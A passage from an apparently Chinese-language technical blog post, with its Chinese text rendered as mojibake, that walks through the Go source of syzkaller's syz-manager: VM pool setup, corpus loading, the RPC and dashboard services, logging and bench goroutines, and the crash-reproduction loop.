class="hljs-params">(cfg *mgrconfig.Config, debug <span class="hljs-type">bool</span>)</span></span> (*Pool, <span class="hljs-type">error</span>) &#123;<br>typ, ok := vmimpl.Types[cfg.Type]<br><span class="hljs-keyword">if</span> !ok &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;unknown instance type &#x27;%v&#x27;&quot;</span>, cfg.Type)<br>&#125;<br>env := &amp;vmimpl.Env&#123;<br>Name:      cfg.Name,<br>OS:        cfg.TargetOS,<br>Arch:      cfg.TargetVMArch,<br>Workdir:   cfg.Workdir,<br>Image:     cfg.Image,<br>SSHKey:    cfg.SSHKey,<br>SSHUser:   cfg.SSHUser,<br>Timeouts:  cfg.Timeouts,<br>Debug:     debug,<br>Config:    cfg.VM,<br>KernelSrc: cfg.KernelSrc,<br>&#125;<br>impl, err := typ.Ctor(env)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> &amp;Pool&#123;<br>impl:     impl,<br>workdir:  env.Workdir,<br>template: cfg.WorkdirTemplate,<br>timeouts: cfg.Timeouts,<br>&#125;, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-2-åˆå§‹åŒ–-Managerï¼Œè½½å…¥è¯­æ–™åº“ï¼Œå»ºç«‹é€šä¿¡æœåŠ¡å™¨">Step 2. åˆå§‹åŒ– Managerï¼Œè½½å…¥è¯­æ–™åº“ï¼Œå»ºç«‹é€šä¿¡æœåŠ¡å™¨</h3><p>éšåä¼šåˆ›å»ºç”¨äºå­˜å‚¨ crash çš„æ–‡ä»¶å¤¹ä¸ä¸€ä¸ªæ–°çš„ Reporter å®ä¾‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">crashdir := filepath.Join(cfg.Workdir, <span class="hljs-string">&quot;crashes&quot;</span>)<br>osutil.MkdirAll(crashdir)<br><br>reporter, err := report.NewReporter(cfg)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ›å»ºä¸€ä¸ªåŸºæœ¬çš„ Manager å®ä¾‹ï¼Œç„¶åæ˜¯å››æ­¥èµ°ï¼š</p><ul><li><p><code>preloadCorpus()</code>ï¼šæ£€æŸ¥ <code>corpus.db</code> æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼ˆè‹¥ä¸å­˜åœ¨åˆ™åˆ›å»ºï¼‰å¹¶è½½å…¥ <code>sys/è¦fuzzçš„OS/test</code> ç›®å½•ä¸‹çš„æµ‹è¯•ç”¨æ¨¡æ¿</p><blockquote><p>è¯­æ–™åº“è½½å…¥çš„æ¨¡æ¿æœ¬èº«ç±»ä¼¼äº syzlang æ–‡ä»¶ï¼Œä¾‹å¦‚ <code>sys/linux/pipe</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">pipe2(&amp;(0x7f0000000000)=&#123;&lt;r0=&gt;0x0, &lt;r1=&gt;0x0&#125;, 0x0)<br>close(r0)<br>close(r1)<br></code></pre></td></tr></table></figure></blockquote></li><li><p><code>initStats()</code>ï¼šæ³¨å†Œä¸€ä¸ª prometheus ç›‘è§†å™¨ï¼ˆä¸€ä¸ªå¼€æºçš„ç›‘è§†&amp;é¢„è­¦å·¥å…·åŒ…ï¼‰</p></li><li><p><code>initHTTP()</code>ï¼šåˆ›å»ºä¸€ä¸ª HTTP æœåŠ¡å™¨å¹¶æ³¨å†Œä¸€ç³»åˆ—çš„ç›®å½•ï¼ˆç”¨ä»¥ä¾›ä½¿ç”¨è€…è®¿é—®ï¼‰</p></li><li><p><code>collectUsedFiles()</code>ï¼šæ£€æŸ¥æ‰€éœ€æ–‡ä»¶æ˜¯å¦å­˜åœ¨</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go">mgr := &amp;Manager&#123;<br>cfg:              cfg,<br>vmPool:           vmPool,<br>target:           cfg.Target,<br>sysTarget:        cfg.SysTarget,<br>reporter:         reporter,<br>crashdir:         crashdir,<br>startTime:        time.Now(),<br>stats:            &amp;Stats&#123;haveHub: cfg.HubClient != <span class="hljs-string">&quot;&quot;</span>&#125;,<br>crashTypes:       <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>corpus:           <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]CorpusItem),<br>disabledHashes:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>&#123;&#125;),<br>memoryLeakFrames: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>dataRaceFrames:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>fresh:            <span class="hljs-literal">true</span>,<br>vmStop:           <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>),<br>hubReproQueue:    <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *Crash, <span class="hljs-number">10</span>),<br>needMoreRepros:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>),<br>reproRequest:     <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>usedFiles:        <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]time.Time),<br>saturatedCalls:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>&#125;<br><br>mgr.preloadCorpus()<br>mgr.initStats() <span class="hljs-comment">// åˆå§‹åŒ– prometheus å˜é‡.</span><br>mgr.initHTTP()  <span class="hljs-comment">// åˆ›å»º HTTP æœåŠ¡.</span><br>mgr.collectUsedFiles()<br></code></pre></td></tr></table></figure><p>ä¹‹ååˆ›å»ºä¸€ä¸ª RPC Serverï¼Œç”¨ä»¥åœ¨ Host ä¸ Guest VMs ä¹‹é—´è¿›è¡Œé€šä¿¡ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Create ä¸º fuzzer åˆ›å»º PRC æœåŠ¡å™¨.</span><br>mgr.serv, err = startRPCServer(mgr)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create rpc server: %v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-3-åˆå§‹åŒ–-dashboard-ç›¸å…³"><em>Step 3.  åˆå§‹åŒ– dashboard ç›¸å…³</em></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> cfg.DashboardAddr != <span class="hljs-string">&quot;&quot;</span> &#123;<br>mgr.dash, err = dashapi.New(cfg.DashboardClient, cfg.DashboardAddr, cfg.DashboardKey)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create dashapi connection: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> !cfg.AssetStorage.IsEmpty() &#123;<br>mgr.assetStorage, err = asset.StorageFromConfig(cfg.AssetStorage, mgr.dash)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to init asset storage: %v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-4-åˆ›å»ºã€æ—¥å¿—è¾“å‡ºã€‘åç¨‹">Step 4. åˆ›å»ºã€æ—¥å¿—è¾“å‡ºã€‘åç¨‹</h3><p>æ¥ä¸‹æ¥ä¼šæ–°èµ·ä¸€ä¸ªåç¨‹è¿›è¡Œæ•°æ®è®°å½•çš„å·¥ä½œï¼Œå†…éƒ¨å…¶å®å°±æ˜¯ä¸€ä¸ª<strong>æ¯ 10s è¿›è¡Œä¸€æ¬¡è¿›åº¦é‡‡é›†å¹¶è¾“å‡ºæ—¥å¿—çš„æ— é™å¾ªç¯</strong>ï¼Œä¸»è¦æ˜¯é‡‡é›†æ‰§è¡Œä¿¡æ¯ã€è¯­æ–™è¦†ç›–ç‡ã€crashes ä¿¡æ¯ç­‰ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> lastTime := time.Now(); ; &#123;<br>time.Sleep(<span class="hljs-number">10</span> * time.Second)<br>now := time.Now()<br>diff := now.Sub(lastTime)<br>lastTime = now<br>mgr.mu.Lock()<br><span class="hljs-keyword">if</span> mgr.firstConnect.IsZero() &#123;<br>mgr.mu.Unlock()<br><span class="hljs-keyword">continue</span><br>&#125;<br>mgr.fuzzingTime += diff * time.Duration(atomic.LoadUint32(&amp;mgr.numFuzzing))<br>executed := mgr.stats.execTotal.get()<br>crashes := mgr.stats.crashes.get()<br>corpusCover := mgr.stats.corpusCover.get()<br>corpusSignal := mgr.stats.corpusSignal.get()<br>maxSignal := mgr.stats.maxSignal.get()<br>mgr.mu.Unlock()<br>numReproducing := atomic.LoadUint32(&amp;mgr.numReproducing)<br>numFuzzing := atomic.LoadUint32(&amp;mgr.numFuzzing)<br><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;VMs %v, executed %v, cover %v, signal %v/%v, crashes %v, repro %v&quot;</span>,<br>numFuzzing, executed, corpusCover, corpusSignal, maxSignal, crashes, numReproducing)<br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><h3 id="Step-5-åˆ›å»º-bench-åç¨‹ï¼ˆæ¯éš”ä¸€åˆ†é’Ÿæœ€å°åŒ–è¯­æ–™åº“å¹¶å°†-bench-data-å†™å…¥-bench-æ–‡ä»¶ï¼‰">Step 5. åˆ›å»º bench åç¨‹ï¼ˆæ¯éš”ä¸€åˆ†é’Ÿæœ€å°åŒ–è¯­æ–™åº“å¹¶å°† bench data å†™å…¥ bench æ–‡ä»¶ï¼‰</h3><p>è¿™é‡Œä¼šåˆ¤æ–­å‘½ä»¤è¡Œä¼ å…¥å‚æ•°æ˜¯å¦æœ‰ <code>bench=</code>ï¼Œè‹¥æ˜¯åˆ™è°ƒç”¨ <code>initBench()</code>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> *flagBench != <span class="hljs-string">&quot;&quot;</span> &#123;<br>mgr.initBench()<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>flagBench</code> æ˜¯ä¸€ä¸ªå…¨å±€çš„ flag å˜é‡ï¼Œgolang æä¾›äº†ä¸€ä¸ª <code>flag</code> åŒ…ç”¨ä»¥å¤„ç†å‘½ä»¤è¡Œå‚æ•°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>flagConfig = flag.String(<span class="hljs-string">&quot;config&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;configuration file&quot;</span>)<br>flagDebug  = flag.Bool(<span class="hljs-string">&quot;debug&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;dump all VM output to console&quot;</span>)<br>flagBench  = flag.String(<span class="hljs-string">&quot;bench&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;write execution statistics into this file periodically&quot;</span>)<br>)<br></code></pre></td></tr></table></figure><p><code>initBench()</code> ä¼šå¯åŠ¨ä¸€ä¸ªåç¨‹ï¼Œä¸»è¦å°±æ˜¯ä¸€ä¸ªæ¯éš”ä¸€åˆ†é’Ÿè¿è¡Œä¸€æ¬¡çš„å¾ªç¯ï¼š</p><ul><li>è°ƒç”¨ <code>minimizeCorpus()</code> å°†è¯­æ–™åº“è¿›è¡Œæœ€å°åŒ–</li><li>å‘ <code>bench</code> å‚æ•°æŒ‡å®šçš„æ–‡ä»¶å½“ä¸­å†™å…¥ <code>è¯­æ–™åº“é•¿åº¦ã€å¯åŠ¨æ—¶é—´ã€fuzzing æ—¶é—´\n</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> initBench() &#123;<br>f, err := os.OpenFile(*flagBench, os.O_WRONLY|os.O_CREATE|os.O_EXCL, osutil.DefaultFilePerm)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to open bench file: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> &#123;<br>time.Sleep(time.Minute)<br>vals := mgr.stats.all()<br>mgr.mu.Lock()<br><span class="hljs-keyword">if</span> mgr.firstConnect.IsZero() &#123;<br>mgr.mu.Unlock()<br><span class="hljs-keyword">continue</span><br>&#125;<br>mgr.minimizeCorpus()<br>vals[<span class="hljs-string">&quot;corpus&quot;</span>] = <span class="hljs-type">uint64</span>(<span class="hljs-built_in">len</span>(mgr.corpus))<br>vals[<span class="hljs-string">&quot;uptime&quot;</span>] = <span class="hljs-type">uint64</span>(time.Since(mgr.firstConnect)) / <span class="hljs-number">1e9</span><br>vals[<span class="hljs-string">&quot;fuzzing&quot;</span>] = <span class="hljs-type">uint64</span>(mgr.fuzzingTime) / <span class="hljs-number">1e9</span><br>mgr.mu.Unlock()<br><br>data, err := json.MarshalIndent(vals, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;  &quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to serialize bench data&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> _, err := f.Write(<span class="hljs-built_in">append</span>(data, <span class="hljs-string">&#x27;\n&#x27;</span>)); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to write bench data&quot;</span>)<br>&#125;<br>&#125;<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-6-å¯åŠ¨-dashboard-åç¨‹ï¼Œè¿›å…¥ä¸‹ä¸€é˜¶æ®µ">Step 6. å¯åŠ¨ dashboard åç¨‹ï¼Œè¿›å…¥ä¸‹ä¸€é˜¶æ®µ</h3><p>æ¥ä¸‹æ¥ä¼šå¯åŠ¨ä¸€ä¸ªæ–°çš„åç¨‹ï¼Œä¸»è¦æ˜¯ <em>æ¯éš”ä¸€åˆ†é’Ÿä¸ŠæŠ¥ä¸€æ¬¡ syz-manager çš„çŠ¶æ€ï¼Œè¿™é‡Œä¸å†å±•å¼€</em> ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> mgr.dash != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">go</span> mgr.dashboardReporter()<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åä¼šç®€å•æ£€æŸ¥ä¸€ä¸‹ VM Pool ï¼Œéšåè°ƒç”¨ <code>vmLoop()</code> è¿›å…¥ä¸‹ä¸€é˜¶æ®µï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">osutil.HandleInterrupts(vm.Shutdown)<br><span class="hljs-keyword">if</span> mgr.vmPool == <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;no VMs started (type=none)&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;you are supposed to start syz-fuzzer manually as:&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;syz-fuzzer -manager=manager.ip:%v [other flags as necessary]&quot;</span>, mgr.serv.port)<br>&lt;-vm.Shutdown<br><span class="hljs-keyword">return</span><br>&#125;<br>mgr.vmLoop()<br>&#125;<br></code></pre></td></tr></table></figure><h1>0x04. vmLoop()ï¼šå¯åŠ¨ fuzzingï¼Œç®¡æ§æ•´ä½“æµç¨‹</h1><h2 id="ä¸€ã€VM-åˆ†ç»„ï¼Œåˆå§‹åŒ–èµ„æºæ± ç­‰å˜é‡">ä¸€ã€VM åˆ†ç»„ï¼Œåˆå§‹åŒ–èµ„æºæ± ç­‰å˜é‡</h2><p>ä¸€å¼€å§‹é¦–å…ˆä¼šå°†æ‰€æœ‰çš„ VM åˆ†ä¸ºä¸¤ç»„ï¼šä¸€ç»„è´Ÿè´£ fuzzingï¼Œä¸€ç»„è´Ÿè´£å¤ç° crash ï¼ˆ<code>maxReproVMs</code>ï¼‰ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Manager needs to be refactored (#605).</span><br><span class="hljs-comment">// nolint: gocyclo, gocognit, funlen</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> vmLoop() &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;booting test machines...&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;wait for the connection from test machine...&quot;</span>)<br>instancesPerRepro := <span class="hljs-number">4</span><br>vmCount := mgr.vmPool.Count()<br>maxReproVMs := vmCount - mgr.cfg.FuzzingVMs<br><span class="hljs-keyword">if</span> instancesPerRepro &gt; maxReproVMs &amp;&amp; maxReproVMs &gt; <span class="hljs-number">0</span> &#123;<br>instancesPerRepro = maxReproVMs<br>&#125;<br></code></pre></td></tr></table></figure><p>éšåä¼šè°ƒç”¨ <code>SequentialResourcePool()</code> æ–°å»ºä¸€ä¸ª <code>ResourcePool</code> é˜Ÿåˆ—ï¼Œä¸»è¦è´Ÿè´£å¯¹<strong>ç©ºé—² VM ä½¿ç”¨é¡ºåº</strong>çš„è°ƒæ§ ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">instances := SequentialResourcePool(vmCount, <span class="hljs-number">10</span>*time.Second*mgr.cfg.Timeouts.Scale)<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šåˆå§‹åŒ–ä¸€ç³»åˆ—çš„å˜é‡ï¼š</p><ul><li><code>runDone</code>ï¼šä¿å­˜ fuzzing ç»“æœä¸º crash çš„ <strong>Crash é˜Ÿåˆ—</strong></li><li><code>pendingRepro</code>ï¼šæ ‡è¯†<strong>å¾…å¤ç°çš„ Crash</strong></li><li><code>reproducing</code>ï¼šæ ‡è¯†<strong>æŸä¸ªç±»å‹ Crash</strong> æ˜¯å¦å‡†å¤‡è¢«å¤ç°</li><li><code>reproQueue</code>ï¼šCrash çš„å¤ç°é˜Ÿåˆ—</li><li><code>reproDone</code>ï¼šCrash çš„å¤ç°ç»“æœ</li><li><code>stopPending</code>ï¼šç­‰å¾…åœæ­¢æ ‡å¿—ä½</li><li><code>shutdown</code>ï¼šå·¥ä½œç»ˆæ­¢æ ‡å¿—ä½</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">runDone := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *RunResult, <span class="hljs-number">1</span>)<br>pendingRepro := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[*Crash]<span class="hljs-type">bool</span>)<br>reproducing := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">var</span> reproQueue []*Crash<br>reproDone := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *ReproResult, <span class="hljs-number">1</span>)<br>stopPending := <span class="hljs-literal">false</span><br>shutdown := vm.Shutdown<br></code></pre></td></tr></table></figure><p>æœ€åè¿›å…¥åˆ°ä¸€ä¸ªå¤§å¾ªç¯ä¸­ï¼Œè¿™ä¸ªå¤§å¾ªç¯æ‰æ˜¯çœŸæ­£çš„ fuzzing è°ƒæ§æµç¨‹</p><h2 id="äºŒã€å¤–å±‚å¤§å¾ªç¯ï¼šè°ƒé…ç©ºé—²-VM-è¿›è¡Œ-fuzz-crash-reproï¼Œç­‰å¾…å¤„ç†ä¸åŒ-channel-æ•°æ®">äºŒã€å¤–å±‚å¤§å¾ªç¯ï¼šè°ƒé…ç©ºé—² VM è¿›è¡Œ fuzz &amp; crash reproï¼Œç­‰å¾…å¤„ç†ä¸åŒ channel æ•°æ®</h2><p>å¤§å¾ªç¯çš„ç»ˆæ­¢æ¡ä»¶ä¸º <code>shutdown == nil</code> æˆ–æ˜¯ ResourcePool ä¸­çš„ VM æ•°é‡ä¸æ€»æ•°é‡ä¸ç›¸ç­‰ï¼Œè¿›å…¥å¾ªç¯åé¦–å…ˆä¼šè·å–å½“å‰æ‰€åœ¨é˜¶æ®µï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> shutdown != <span class="hljs-literal">nil</span> || instances.Len() != vmCount &#123;<br>mgr.mu.Lock()<br>phase := mgr.phase<br>mgr.mu.Unlock()<br></code></pre></td></tr></table></figure><h3 id="Step-1-å†…å±‚å°å¾ªç¯ï¼šè·å–å¾…å¤ç°-crash-åŠ å…¥å¤ç°é˜Ÿåˆ—">Step 1. å†…å±‚å°å¾ªç¯ï¼šè·å–å¾…å¤ç° crash åŠ å…¥å¤ç°é˜Ÿåˆ—</h3><p>å°å¾ªç¯ä¼šéå† <code>pendingRepro</code> ä¸­çš„ crashï¼š</p><ul><li>è‹¥æœªè¢«å¤ç°åˆ™ä» pendingRepro ä¸­åˆ é™¤</li><li>è°ƒç”¨ <code>needRepro()</code> æ£€æŸ¥æ˜¯å¦éœ€è¦å¤ç°</li><li>æ ‡è®°è¯¥æ ‡é¢˜çš„ crash å·²åœ¨å¤ç°ï¼Œå¹¶åŠ å…¥å¤ç°é˜Ÿåˆ—ä¸­</li></ul><p>è¿™é‡Œçš„ <code>crash.Title</code> å…¶å®æ˜¯ <strong>Oops çš„ç¬¬ä¸€è¡Œæ–‡æœ¬ï¼Œ<strong>å³</strong>åŒä¸€æ—¶åˆ»ä»…ä¼šå¤ç°åŒç±» crash ä¸­çš„ä¸€ä¸ª</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> crash := <span class="hljs-keyword">range</span> pendingRepro &#123;<br><span class="hljs-keyword">if</span> reproducing[crash.Title] &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-built_in">delete</span>(pendingRepro, crash)<br><span class="hljs-keyword">if</span> !mgr.needRepro(crash) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: add to repro queue &#x27;%v&#x27;&quot;</span>, crash.Title)<br>reproducing[crash.Title] = <span class="hljs-literal">true</span><br>reproQueue = <span class="hljs-built_in">append</span>(reproQueue, crash)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-2-åˆ¤æ–­æ˜¯å¦å¯ä»¥å¯¹-crash-è¿›è¡Œå¤ç°å¹¶è°ƒæ§-VM">Step 2. åˆ¤æ–­æ˜¯å¦å¯ä»¥å¯¹ crash è¿›è¡Œå¤ç°å¹¶è°ƒæ§ VM</h3><p>æ¥ä¸‹æ¥ä¼šè¾“å‡ºä¸€è¡Œæ—¥å¿—ï¼Œä¹‹åå®šä¹‰ä¸€ä¸ªé—­åŒ…å‡½æ•° <code>canRepro</code>ï¼Œç”¨æ¥åˆ¤æ–­<strong>å½“å‰æ˜¯å¦å¯ä»¥è¿›è¡Œ crash å¤ç°</strong>ï¼Œä¸»è¦åˆ¤æ–­ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶æ˜¯å¦æ»¡è¶³ï¼š</p><ul><li>å½“å‰é˜¶æ®µæ˜¯å¦è¶…è¿‡ <code>phaseTriagedHub</code></li><li>å¾…å¤ç°é˜Ÿåˆ— <code>reproQueue</code> æ˜¯å¦ä¸ä¸ºç©º</li><li>åŠ ä¸Šè¯¥ crash åæ‰€æœ‰ç”¨æ¥å¤ç° crash çš„ VM æ•°é‡æ˜¯å¦å°äº <code>maxReproVMs</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: phase=%v shutdown=%v instances=%v/%v %+v repro: pending=%v reproducing=%v queued=%v&quot;</span>,<br>phase, shutdown == <span class="hljs-literal">nil</span>, instances.Len(), vmCount, 